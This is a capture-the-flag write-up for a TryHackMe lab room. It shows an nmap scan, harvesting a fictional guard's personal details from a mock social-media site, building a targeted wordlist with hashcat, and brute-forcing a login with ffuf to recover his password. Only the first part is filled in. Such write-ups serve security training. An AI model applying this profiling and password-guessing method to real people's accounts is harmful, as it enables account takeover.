# URL
https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu
# Concept
* social media app enumeration on targetted user / recon
* brute force password attack with lockout bypass
# Method of solve
* before scanning the machine, we need to visit a specific port on the target machine:
```
http://MACHINE_IP:21337
```
* on that page we can input the key from the previous webpage and then we can scan the machine:
```
nmap -p- -sV -T4 -vv <MACHINE_IP>
```
* this is the result:
```
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp    open  http        syn-ack ttl 62 nginx 1.24.0 (Ubuntu)		HopSec Security Console
8000/tcp  open  http-alt    syn-ack ttl 61					Fakebook (social media?)
8080/tcp  open  http        syn-ack ttl 62 SimpleHTTPServer 0.6 (Python 3.12.3)	HopSec Security Console (real?)
9001/tcp  open  tor-orport? syn-ack ttl 61					??? Asylum Gate Control (SCADA System)
13400/tcp open  http        syn-ack ttl 62 nginx 1.24.0 (Ubuntu)		Facility Video Portal
13401/tcp open  http        syn-ack ttl 62 Werkzeug httpd 3.1.3 (Python 3.12.3)	???
13402/tcp open  http        syn-ack ttl 62 nginx 1.24.0 (Ubuntu)		Nginx Default Page
13403/tcp open  unknown     syn-ack ttl 62					???					
13404/tcp open  unknown     syn-ack ttl 62					Unauthorized		
21337/tcp open  http        syn-ack ttl 62 Werkzeug httpd 3.0.1 (Python 3.12.3)	Unlock Hopper's Memories
```
## Part 1 - Cells and Storage Area
* we can access the `fakebook` social media on port `8000` and create an account
* once logged in, we see that there are many posts by a guard named `hopkins`
* from the posts, we gather the following info:
  * his email address is `guard.hopkins@hopsecasylum.com`
  * his dog is named `JohnnyBoy`
  * his favorite food is `pizza`
  * his birth year is `1982`
  * he's previously appended `1234$` to a previous password
* we can put all these words in a list, then create a list of two-element passwords with this command:
```
/usr/lib/hashcat-utils/combinator.bin hopkins_info.txt hopkins_info.txt > combo_pass.txt
```
* create a rules file for use with hashcat with the following contents:
```
$!
$$
```
* then create the mutated passwords with hashcat with this command:
```
hashcat -r append_special.rule --stdout combo_pass.txt > combos_mut.txt
cat combo_pass.txt combos_mut.txt > full_pass.txt
```
* we can then get the login request in Burp Suite for the login page at the app on port `8080`
* we specify the username as `guard.hopkins@hopsecasylum.com` and the password as `FUZZ`
* copy the Burp Suite request as `request.txt`, then fuzz the app using `ffuf`
```
ffuf -request request.txt -w ./full_pass.txt --request-proto HTTP -mc all -fs 71
```
* we find the password is `Johnnyboy1982!`
* Upon login, we see that there is an app that allows us to unlock the door to the `Cells / Storage`
* click on the key icon in that area and we'll receive a flag that we can submit
## Part 2 - Lobby Area
## Part 3 - Psych Ward Area
## Part 4 - Main Corridor Area
## Part 5 - Unlock Facility Door




